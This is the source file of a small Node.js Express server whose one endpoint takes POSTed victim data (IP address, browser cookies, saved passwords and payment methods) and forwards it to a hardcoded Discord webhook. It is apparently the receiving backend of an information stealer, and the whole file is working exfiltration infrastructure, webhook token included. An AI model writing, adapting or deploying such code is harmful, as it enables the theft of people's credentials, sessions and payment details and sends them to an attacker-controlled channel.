const express = require('express');
const fetch = require('node-fetch');
const app = express();
const port = 3000;

app.use(express.json());

app.post('/collect-data', async (req, res) => {
    const data = req.body;

    const embed = {
        title: 'User Data Collected',
        description: `**IP Address**: ${data.ipAddress}\n**Total Cookies**: ${data.totalCookies}\n**Total Passwords**: ${data.totalPasswords}\n**Total Payment Methods**: ${data.totalPaymentMethods}`,
        fields: [
            {
                name: '__Cookies__',
                value: data.cookies
            },
            {
                name: '__Passwords__',
                value: data.passwords
            },
            {
                name: '__Payment Methods__',
                value: data.paymentMethods
            }
        ]
    };

    const payload = {
        embeds: [embed]
    };

    try {
        await fetch('https://discord.com/api/webhooks/1437409358177763338/tqPgOTbwLvhNBhABDntVi1OhfKMld6mc_k8nG9ZNO6fD09rRBlnGU6RuONKbzI9FVzRb', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });
        res.status(200).send('Data sent to Discord');
    } catch (error) {
        console.error('Error sending data to Discord:', error);
        res.status(500).send('Error sending data to Discord');
    }
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
